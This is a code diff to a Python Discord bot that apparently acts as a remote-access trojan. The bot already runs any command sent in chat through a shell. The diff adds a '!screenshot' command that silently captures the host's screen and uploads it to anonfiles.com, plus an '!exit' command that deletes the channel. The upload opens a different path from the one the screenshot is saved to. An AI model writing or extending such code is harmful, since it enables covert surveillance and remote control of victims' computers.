@@ -1,4 +1,4 @@
-import os, discord, json, subprocess, asyncio, requests
+import os, discord, subprocess, requests, pyautogui
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -99,6 +99,17 @@ async def on_message(message):
         file = message.content.split(" ")[1]
         subprocess.Popen(file, shell=True)
         embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content == "!exit":
+        await message.channel.delete()
+        await bot.close()
+
+    if message.content == "!screenshot":
+        screenshot = pyautogui.screenshot()
+        screenshot.save(os.getenv("TEMP") + "\\screenshot.png")
+        link = requests.post("https://api.anonfiles.com/upload", files={"file": open("screenshot.png", "rb")}).json()["data"]["file"]["url"]["full"]
+        embed = discord.Embed(title="Screenshot", description=f"```{link}```", color=0xfafafa)
         await message.reply(embed=embed)
 
 bot.run(token)
